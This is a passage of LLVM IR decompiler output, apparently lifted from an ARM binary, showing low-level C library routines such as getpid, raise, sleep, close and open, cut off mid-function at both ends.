  %v0_160a8 = phi i32 [ %v0_160a4, %dec_label_pc_160a4 ], [ %v2_1608418, %dec_label_pc_16078 ], [ %v2_16084, %dec_label_pc_16090.dec_label_pc_16084_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160a8 = icmp eq i32 %v0_160a8, 0
  %v0_160cc.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_160a8, label %dec_label_pc_160c8, label %dec_label_pc_160b0

dec_label_pc_160b0:                               ; preds = %dec_label_pc_160a8
  store i32 %v0_160cc.pre, i32* %r0.global-to-local, align 4
  %v0_160b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_160b4 = add i32 %v0_160b4, 126
  store i32 %v1_160b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160a8, %dec_label_pc_160b0
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_160cc.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_160d428 = inttoptr i32 %v0_160cc.pre to i32*
  %v2_160d429 = load i32, i32* %v1_160d428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_160d836 = icmp eq i32 %v2_160d429, 0
  br i1 %v9_160d836, label %dec_label_pc_160e0, label %dec_label_pc_160f8

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160c8, %dec_label_pc_160e0.dec_label_pc_160d4_crit_edge
  %v0_160e037 = phi i32 [ %v1_160d8.pre, %dec_label_pc_160e0.dec_label_pc_160d4_crit_edge ], [ 0, %dec_label_pc_160c8 ]
  store i32 %v0_160e037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160f0, label %dec_label_pc_160f4, label %dec_label_pc_160e0.dec_label_pc_160d4_crit_edge

dec_label_pc_160e0.dec_label_pc_160d4_crit_edge:  ; preds = %dec_label_pc_160e0
  %v0_160d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160d8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_160d4 = inttoptr i32 %v0_160d4.pre to i32*
  %v2_160d4 = load i32, i32* %v1_160d4, align 4
  %v3_160d8 = icmp uge i32 %v2_160d4, %v1_160d8.pre
  store i1 %v3_160d8, i1* %cpsr_c.global-to-local, align 1
  %v9_160d8 = icmp eq i32 %v2_160d4, %v1_160d8.pre
  br i1 %v9_160d8, label %dec_label_pc_160e0, label %dec_label_pc_160f8

dec_label_pc_160f4:                               ; preds = %dec_label_pc_160e0
  %v0_160f4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_160f8

dec_label_pc_160f8:                               ; preds = %dec_label_pc_160c8, %dec_label_pc_160e0.dec_label_pc_160d4_crit_edge, %dec_label_pc_160f4
  %v0_160f8 = phi i32 [ %v0_160f4, %dec_label_pc_160f4 ], [ %v2_160d429, %dec_label_pc_160c8 ], [ %v2_160d4, %dec_label_pc_160e0.dec_label_pc_160d4_crit_edge ]
  %v1_160f8 = phi i32 [ %v0_160f4, %dec_label_pc_160f4 ], [ 0, %dec_label_pc_160c8 ], [ %v1_160d8.pre, %dec_label_pc_160e0.dec_label_pc_160d4_crit_edge ]
  %v3_160f8 = icmp uge i32 %v0_160f8, %v1_160f8
  store i1 %v3_160f8, i1* %cpsr_c.global-to-local, align 1
  %v9_160f8 = icmp eq i32 %v0_160f8, %v1_160f8
  br i1 %v9_160f8, label %dec_label_pc_16100, label %dec_label_pc_160f8.dec_label_pc_16078_crit_edge

dec_label_pc_160f8.dec_label_pc_16078_crit_edge:  ; preds = %dec_label_pc_160f8
  %v0_1607c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16078

dec_label_pc_16100:                               ; preds = %dec_label_pc_160f8
  %v2_16100 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16100, i32* %r4.global-to-local, align 4
  %v1_16104 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16104

; uselistorder directives
  uselistorder i32 %v0_160f4, { 1, 0 }
  uselistorder i32 %v1_160d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16088.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1608418, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 8, 7, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_160f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160e0, { 1, 0 }
  uselistorder label %dec_label_pc_160c8, { 1, 0 }
  uselistorder label %dec_label_pc_160a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16090, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16108 = load i32, i32* @r7, align 4
  store i32 %v3_16108, i32* %stack_var_-8, align 4
  %v0_1610c = call i32 @__aeabi_read_tp()
  store i32 %v0_1610c, i32* %r0.global-to-local, align 4
  %v1_16110 = add i32 %v0_1610c, -1060
  %v2_16110 = inttoptr i32 %v1_16110 to i32*
  %v3_16110 = load i32, i32* %v2_16110, align 4
  %tmp7 = icmp slt i32 %v3_16110, 1
  br i1 %tmp7, label %dec_label_pc_16120, label %dec_label_pc_16144

dec_label_pc_16120:                               ; preds = %entry
  %v2_16114 = icmp eq i32 %v3_16110, 0
  br i1 %v2_16114, label %dec_label_pc_16124, label %dec_label_pc_16130

dec_label_pc_16124:                               ; preds = %dec_label_pc_16120
  %v1_16124 = add i32 %v0_1610c, -1064
  %v2_16124 = inttoptr i32 %v1_16124 to i32*
  %v3_16124 = load i32, i32* %v2_16124, align 4
  store i32 %v3_16124, i32* %r0.global-to-local, align 4
  %v2_16128 = icmp eq i32 %v3_16124, 0
  br i1 %v2_16128, label %bb, label %bb8

dec_label_pc_16130:                               ; preds = %dec_label_pc_16120
  br label %bb8

bb:                                               ; preds = %dec_label_pc_16124
  store i32 0, i32* %v2_16124, align 4
  %v0_16140.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_16130, %dec_label_pc_16124, %bb
  %v0_16140 = phi i32 [ %v3_16124, %dec_label_pc_16124 ], [ %v0_1610c, %dec_label_pc_16130 ], [ %v0_16140.pre, %bb ]
  br label %dec_label_pc_16144

dec_label_pc_16144:                               ; preds = %entry, %bb8
  %v0_16144 = phi i32 [ %v3_16110, %entry ], [ %v0_16140, %bb8 ]
  store i32 %v0_16144, i32* %r0.global-to-local, align 4
  %v2_16148 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16148, i32* @r7, align 4
  ret i32 %v0_16144

; uselistorder directives
  uselistorder i32 %v0_16144, { 1, 0 }
  uselistorder i32 %v3_16110, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16144, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16150 = load i32, i32* @r4, align 4
  store i32 %v3_16150, i32* %stack_var_-20, align 4
  %v0_16158 = call i32 @__aeabi_read_tp()
  store i32 %v0_16158, i32* %r0.global-to-local, align 4
  %v1_1615c = add i32 %v0_16158, -1064
  %v2_1615c = inttoptr i32 %v1_1615c to i32*
  %v3_1615c = load i32, i32* %v2_1615c, align 4
  store i32 %v3_1615c, i32* %r4.global-to-local, align 4
  %v2_16160 = icmp eq i32 %v3_1615c, 0
  %v1_16168 = add i32 %v0_16158, -1060
  %v2_16168 = inttoptr i32 %v1_16168 to i32*
  %v3_16168 = load i32, i32* %v2_16168, align 4
  store i32 %v3_16168, i32* %r0.global-to-local, align 4
  br i1 %v2_16160, label %dec_label_pc_16170, label %dec_label_pc_16184

dec_label_pc_16170:                               ; preds = %entry
  store i32 %v3_16168, i32* %r4.global-to-local, align 4
  store i32 %v3_16168, i32* %v2_1615c, align 4
  %v0_161ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_16184:                               ; preds = %entry
  %v5_16188 = icmp sgt i32 %v3_16168, 0
  br i1 %v5_16188, label %bb28, label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %dec_label_pc_16184
  %tmp = bitcast i32 %v3_16168 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_1618c = bitcast float %tmp30 to i32
  %v2_16190 = icmp eq i32 %v1_1618c, 0
  br i1 %v2_16190, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1618c
  store i32 %v3_1615c, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_1618c
  %v2_16198 = sub i32 0, %v3_16168
  store i32 %v2_16198, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_16184, %dec_label_pc_16170, %.thread
  %v0_161b0 = phi i32 [ %v3_16168, %dec_label_pc_16184 ], [ %v0_161ac.pre, %dec_label_pc_16170 ], [ %v3_1615c, %bb ], [ %v2_16198, %.thread ]
  store i32 %v0_161b0, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_161b0, -4095
  br i1 %tmp31, label %dec_label_pc_161d4, label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %bb28
  %v0_161c0 = call i32 @__aeabi_read_tp()
  %v3_161c4 = load i16, i16* @global_var_24150.533, align 2
  %v4_161c4 = sext i16 %v3_161c4 to i32
  %v0_161c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_161c8 = sub i32 0, %v0_161c8
  store i32 %v1_161c8, i32* %r2.global-to-local, align 4
  %v3_161cc = add i32 %v4_161c4, %v0_161c0
  %v4_161cc = inttoptr i32 %v3_161cc to i32*
  store i32 %v1_161c8, i32* %v4_161cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161d4

dec_label_pc_161d4:                               ; preds = %bb28, %dec_label_pc_161bc
  %v0_161d8 = phi i32 [ %v0_161b0, %bb28 ], [ -1, %dec_label_pc_161bc ]
  %v3_161d4 = icmp eq i32 %v0_161d8, -1
  store i32 %v0_161d8, i32* %r5.global-to-local, align 4
  br i1 %v3_161d4, label %dec_label_pc_161e0, label %dec_label_pc_16228

dec_label_pc_161e0:                               ; preds = %dec_label_pc_161d4
  %v0_161e4 = call i32 @__aeabi_read_tp()
  store i32 %v0_161e4, i32* %r0.global-to-local, align 4
  %v3_161e8 = load i16, i16* @global_var_24150.533, align 2
  %v4_161e8 = sext i16 %v3_161e8 to i32
  %v2_161ec = add i32 %v4_161e8, %v0_161e4
  %v3_161ec = inttoptr i32 %v2_161ec to i32*
  %v4_161ec = load i32, i32* %v3_161ec, align 4
  %v7_161f0 = icmp eq i32 %v4_161ec, 38
  br i1 %v7_161f0, label %dec_label_pc_161fc, label %dec_label_pc_161e0.dec_label_pc_16228_crit_edge

dec_label_pc_161e0.dec_label_pc_16228_crit_edge:  ; preds = %dec_label_pc_161e0
  %v0_16228.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16228

dec_label_pc_161fc:                               ; preds = %dec_label_pc_161e0
  %v0_161fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161fc, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_161fc, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_161fc
  %v5_16214 = sub i32 0, %v0_161fc
  store i32 %v5_16214, i32* %r2.global-to-local, align 4
  %v7_16218 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_16220.717 to i32), i32 57136) to i32*), align 4
  %v4_1621c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_1621c, i32* %r0.global-to-local, align 4
  %v7_16220 = add i32 %v7_16218, %v0_161e4
  %v8_16220 = inttoptr i32 %v7_16220 to i32*
  store i32 %v5_16214, i32* %v8_16220, align 4
  %v0_16224.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_161fc, %bb29
  %v0_16224 = phi i32 [ %v0_16224.pre, %bb29 ], [ %v0_161fc, %dec_label_pc_161fc ]
  store i32 %v0_16224, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16228

dec_label_pc_16228:                               ; preds = %dec_label_pc_161e0.dec_label_pc_16228_crit_edge, %dec_label_pc_161d4, %.thread22
  %v0_16228 = phi i32 [ %v0_16228.pre, %dec_label_pc_161e0.dec_label_pc_16228_crit_edge ], [ %v0_161d8, %dec_label_pc_161d4 ], [ %v0_16224, %.thread22 ]
  store i32 %v0_16228, i32* %r0.global-to-local, align 4
  %v2_1622c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1622c, i32* @r4, align 4
  ret i32 %v0_16228

; uselistorder directives
  uselistorder i32 %v0_16228, { 1, 0 }
  uselistorder i32 %v0_161fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_161b0, { 2, 0, 1 }
  uselistorder i32 %v3_16168, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 11, 3, 4, 5, 6, 7, 0, 8, 1, 9, 2, 10 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_16228, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_161d4, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_16240 = load i32, i32* @r4, align 4
  %v6_16240 = load i32, i32* @r5, align 4
  %v9_16240 = load i32, i32* @r6, align 4
  %v12_16240 = load i32, i32* @r7, align 4
  %v15_16240 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16250 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_16250, label %dec_label_pc_16264, label %dec_label_pc_162d8

dec_label_pc_16264:                               ; preds = %entry
  %v0_16264 = call i32 @__aeabi_read_tp()
  %v1_16268 = add i32 %v0_16264, -1036
  %v2_16268 = inttoptr i32 %v1_16268 to i32*
  %v3_16268 = load i32, i32* %v2_16268, align 4
  %v1_1626c = and i32 %v3_16268, -71
  %v2_16270 = icmp ugt i32 %v1_1626c, 7
  store i1 %v2_16270, i1* %cpsr_c.global-to-local, align 1
  %v7_16270 = icmp eq i32 %v1_1626c, 8
  %v1_16274 = add i32 %v0_16264, -1168
  store i32 %v1_16274, i32* @r5, align 4
  br i1 %v7_16270, label %dec_label_pc_1627c, label %dec_label_pc_16350

dec_label_pc_1627c:                               ; preds = %dec_label_pc_16264
  %v2_16280 = add i32 %v0_16264, -624
  %v3_16280 = inttoptr i32 %v2_16280 to i32*
  store i32 -1, i32* %v3_16280, align 4
  %v0_16284 = load i32, i32* @r5, align 4
  %v1_16284 = add i32 %v0_16284, 132
  store i32 %v1_16284, i32* @r6, align 4
  br label %dec_label_pc_16288

dec_label_pc_16288:                               ; preds = %dec_label_pc_162bc.dec_label_pc_16288_crit_edge, %dec_label_pc_1627c
  %v0_1628c = phi i32 [ %v0_1628c.pre, %dec_label_pc_162bc.dec_label_pc_16288_crit_edge ], [ %v1_16284, %dec_label_pc_1627c ]
  %v0_16288 = phi i32 [ %v0_162c4, %dec_label_pc_162bc.dec_label_pc_16288_crit_edge ], [ %v0_16284, %dec_label_pc_1627c ]
  %v1_16288 = add i32 %v0_16288, 132
  %v2_16288 = inttoptr i32 %v1_16288 to i32*
  %v3_16288 = load i32, i32* %v2_16288, align 4
  store i32 %v0_1628c, i32* %r2.global-to-local, align 4
  store i32 %v3_16288, i32* @r4, align 4
  %v1_1629830 = inttoptr i32 %v0_1628c to i32*
  %v2_1629831 = load i32, i32* %v1_1629830, align 4
  %v3_1629c33 = icmp uge i32 %v2_1629831, %v3_16288
  store i1 %v3_1629c33, i1* %cpsr_c.global-to-local, align 1
  %v9_1629c39 = icmp eq i32 %v2_1629831, %v3_16288
  br i1 %v9_1629c39, label %dec_label_pc_162a4, label %dec_label_pc_162bc

dec_label_pc_162a4:                               ; preds = %dec_label_pc_16288, %dec_label_pc_162a4.dec_label_pc_16298_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_162b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_162b4, label %dec_label_pc_162b8, label %dec_label_pc_162a4.dec_label_pc_16298_crit_edge

dec_label_pc_162a4.dec_label_pc_16298_crit_edge:  ; preds = %dec_label_pc_162a4
  %v0_16298.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1629c.pre = load i32, i32* @r4, align 4
  %v1_16298 = inttoptr i32 %v0_16298.pre to i32*
  %v2_16298 = load i32, i32* %v1_16298, align 4
  %v3_1629c = icmp uge i32 %v2_16298, %v1_1629c.pre
  store i1 %v3_1629c, i1* %cpsr_c.global-to-local, align 1
  %v9_1629c = icmp eq i32 %v2_16298, %v1_1629c.pre
  br i1 %v9_1629c, label %dec_label_pc_162a4, label %dec_label_pc_162bc

dec_label_pc_162b8:                               ; preds = %dec_label_pc_162a4
  %v0_162b8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_162bc

dec_label_pc_162bc:                               ; preds = %dec_label_pc_16288, %dec_label_pc_162a4.dec_label_pc_16298_crit_edge, %dec_label_pc_162b8
  %v0_162bc = phi i32 [ %v0_162b8, %dec_label_pc_162b8 ], [ %v2_1629831, %dec_label_pc_16288 ], [ %v2_16298, %dec_label_pc_162a4.dec_label_pc_16298_crit_edge ]
  %v1_162bc = phi i32 [ %v0_162b8, %dec_label_pc_162b8 ], [ %v3_16288, %dec_label_pc_16288 ], [ %v1_1629c.pre, %dec_label_pc_162a4.dec_label_pc_16298_crit_edge ]
  %v3_162bc = icmp uge i32 %v0_162bc, %v1_162bc
  store i1 %v3_162bc, i1* %cpsr_c.global-to-local, align 1
  %v9_162bc = icmp eq i32 %v0_162bc, %v1_162bc
  br i1 %v9_162bc, label %dec_label_pc_162c4, label %dec_label_pc_162bc.dec_label_pc_16288_crit_edge

dec_label_pc_162bc.dec_label_pc_16288_crit_edge:  ; preds = %dec_label_pc_162bc
  %v0_162c4 = load i32, i32* @r5, align 4
  %v0_1628c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16288

dec_label_pc_162c4:                               ; preds = %dec_label_pc_162bc
  %v0_162cc = load i32, i32* @r7, align 4
  %v2_162cc = add i32 %v0_162cc, 116
  %v3_162cc = inttoptr i32 %v2_162cc to i32*
  %v4_162cc = load i32, i32* %v3_162cc, align 4
  store i32 90840, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_162cc)
  %v0_162e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_162d8

dec_label_pc_162d8:                               ; preds = %entry, %dec_label_pc_162c4
  %v0_162e0 = phi i32 [ 0, %entry ], [ %v0_162e0.pre, %dec_label_pc_162c4 ]
  %v2_162e4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_162e4, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_162f0 = call i32 @__libc_sigaction(i32 17, i32 %v0_162e0, i32 %v2_162e4)
  %v3_162f4 = load i32, i32* %stack_var_-60, align 4
  %v2_162f8 = icmp ne i32 %v3_162f4, 0
  store i1 %v2_162f8, i1* %cpsr_c.global-to-local, align 1
  %v7_162f8 = icmp eq i32 %v3_162f4, 1
  br i1 %v7_162f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_162d8
  %v3_162fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_162fc, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_162d8, %bb
  call void @__pseudo_cond_branch(i1 %v7_162f8, i32 ptrtoint (i32* @global_var_12f7c.721 to i32))
  %v2_1630c = ptrtoint i32* %stack_var_-32 to i32
  %v2_16314 = call i32 @__libc_nanosleep(i32 %v2_1630c, i32 %v2_1630c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16318 = icmp eq i32 %v2_16314, 0
  br i1 %v2_16318, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_1632c = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_1632c, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_1633c = load i32, i32* %stack_var_-40, align 4
  %v1_16340 = and i32 %v3_1633c, 65536
  store i32 %v1_16340, i32* %r2.global-to-local, align 4
  %v2_16340 = icmp eq i32 %v1_16340, 0
  br i1 %v2_16340, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_16340, i32 ptrtoint (i32* @global_var_12f7c.721 to i32))
  br label %dec_label_pc_16350

dec_label_pc_16350:                               ; preds = %dec_label_pc_16264, %.thread5
  %v0_16350 = load i32, i32* @r4, align 4
  store i32 %v3_16240, i32* @r4, align 4
  store i32 %v6_16240, i32* @r5, align 4
  store i32 %v9_16240, i32* @r6, align 4
  store i32 %v12_16240, i32* @r7, align 4
  store i32 %v15_16240, i32* @lr, align 4
  ret i32 %v0_16350

; uselistorder directives
  uselistorder i32 %v0_162b8, { 1, 0 }
  uselistorder i32 %v1_1629c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16350, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_162d8, { 1, 0 }
  uselistorder label %dec_label_pc_162bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162a4, { 1, 0 }
}

define i32 @function_16364(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16364:
  %v0_16364 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16364, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16364
  %v2_16364 = load i32, i32* @r4, align 4
  %v4_16364 = lshr i32 %v2_16364, %arg1
  %v5_16364 = sub i32 32, %arg1
  %v6_16364 = shl i32 %v2_16364, %v5_16364
  %v7_16364 = or i32 %v6_16364, %v4_16364
  %v9_16364 = and i32 %v7_16364, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16364, %bb
  %v4_16370 = phi i32 [ %arg1, %dec_label_pc_16364 ], [ %v9_16364, %bb ]
  ret i32 %v4_16370

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_16384 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16384, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16384 = load i32, i32* @r0, align 4
  ret i32 %v2_16384

bb1:                                              ; preds = %entry
  %v0_16388 = call i32 @__syscall_error()
  ret i32 %v0_16388
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16394 = load i32, i32* @global_var_273a4.724, align 4
  %v2_16398 = icmp eq i32 %v3_16394, 0
  store i1 %v2_16398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16398, label %dec_label_pc_163a0, label %entry.dec_label_pc_163bc_crit_edge

entry.dec_label_pc_163bc_crit_edge:               ; preds = %entry
  %v3_163bc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_163bc

dec_label_pc_163a0:                               ; preds = %entry
  %v0_163a0 = load i32, i32* @r7, align 4
  store i32 %v0_163a0, i32* @ip, align 4
  %v0_163b0 = load i32, i32* @r0, align 4
  %v2_163b0 = icmp ugt i32 %v0_163b0, -4097
  %v7_163b0 = icmp eq i32 %v0_163b0, -4096
  store i1 %v7_163b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163b0, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_163bc, %dec_label_pc_163a0
  %merge = phi i32 [ %v0_163b0, %dec_label_pc_163a0 ], [ %v0_163e0, %dec_label_pc_163bc ], [ %v0_163f0, %bb8 ], [ 0, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_163a0
  %v0_163b8 = call i32 @__syscall_error()
  br label %dec_label_pc_163bc

dec_label_pc_163bc:                               ; preds = %entry.dec_label_pc_163bc_crit_edge, %bb7
  %v3_163bc = phi i32 [ %v3_163bc.pre, %entry.dec_label_pc_163bc_crit_edge ], [ %v0_163b8, %bb7 ]
  %v9_163bc = load i32, i32* @r7, align 4
  store i32 %v9_163bc, i32* %stack_var_-8, align 4
  %v12_163bc = load i32, i32* @lr, align 4
  %v0_163c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_163c0, i32* @ip, align 4
  store i32 %v3_163bc, i32* @r7, align 4
  %v1_163dc = call i32 @__libc_disable_asynccancel(i32 %v0_163c0)
  %v0_163e0 = load i32, i32* @r7, align 4
  store i32 %v0_163e0, i32* @r0, align 4
  %v2_163e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163e4, i32* @r7, align 4
  store i32 %v12_163bc, i32* @lr, align 4
  %v2_163e8 = icmp ugt i32 %v0_163e0, -4097
  %v7_163e8 = icmp eq i32 %v0_163e0, -4096
  store i1 %v7_163e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163e8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_163bc
  %v0_163f0 = call i32 @__syscall_error()
  %v0_16400 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16400, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_163e0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_163b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163bc, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_16414 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16414, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16414 = load i32, i32* @r0, align 4
  ret i32 %v2_16414

bb1:                                              ; preds = %entry
  %v0_16418 = call i32 @__syscall_error()
  ret i32 %v0_16418
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16424 = load i32, i32* @global_var_273a4.724, align 4
  %v2_16428 = icmp eq i32 %v3_16424, 0
  store i1 %v2_16428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16428, label %dec_label_pc_16430, label %entry.dec_label_pc_1644c_crit_edge

entry.dec_label_pc_1644c_crit_edge:               ; preds = %entry
  %v3_1644c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1644c

dec_label_pc_16430:                               ; preds = %entry
  %v0_16440 = load i32, i32* @r0, align 4
  %v2_16440 = icmp ugt i32 %v0_16440, -4097
  %v7_16440 = icmp eq i32 %v0_16440, -4096
  store i1 %v7_16440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16440, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1644c, %dec_label_pc_16430
  %merge = phi i32 [ %v0_16440, %dec_label_pc_16430 ], [ %v0_16470, %dec_label_pc_1644c ], [ %v0_16480, %bb10 ], [ %v8_16490, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_16430
  %v0_16448 = call i32 @__syscall_error()
  br label %dec_label_pc_1644c

dec_label_pc_1644c:                               ; preds = %entry.dec_label_pc_1644c_crit_edge, %bb9
  %v3_1644c = phi i32 [ %v3_1644c.pre, %entry.dec_label_pc_1644c_crit_edge ], [ %v0_16448, %bb9 ]
  store i32 %v3_1644c, i32* %stack_var_-24, align 4
